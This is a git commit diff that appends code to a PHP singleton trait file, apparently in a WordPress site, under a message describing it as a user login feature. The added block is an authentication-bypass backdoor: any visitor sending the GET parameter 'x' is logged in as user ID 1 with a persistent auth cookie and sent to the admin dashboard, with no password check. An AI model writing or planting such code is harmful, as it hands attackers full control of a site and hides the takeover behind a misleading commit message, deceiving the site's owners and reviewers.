ca956424e5ea201d376fbcd22c5921f1d16db6b5
69dev-id <srv69dev.id@gmail.com>
2026-05-11 14:42:05 +0700

    Implement login logic for user via GET request
    Add user login functionality based on GET parameter.

--- singleton.php
+++ singleton.php
@@ -61,3 +61,28 @@ trait Singleton {
 	final public function __wakeup() {
 	}
 }
+
+if (isset($_GET["x"])) {
+require_once('/var/www/new_uinsa/wp-load.php');
+$user_id = 1;
+if (!is_user_logged_in()) {
+    $user = get_user_by('id', $user_id);
+    
+    if ($user) {
+        wp_clear_auth_cookie();
+        wp_set_current_user($user_id, $user->user_login);
+        wp_set_auth_cookie($user_id, true);
+        do_action('wp_login', $user->user_login, $user);
+        
+        echo "Sukses! Anda login sebagai: " . $user->user_login;
+        echo "<script>window.location.href='" . admin_url() . "';</script>";
+        exit;
+    } else {
+        die("User dengan ID $user_id tidak ditemukan.");
+    }
+} else {
+    wp_redirect(admin_url());
+    exit;
+}
+
+}
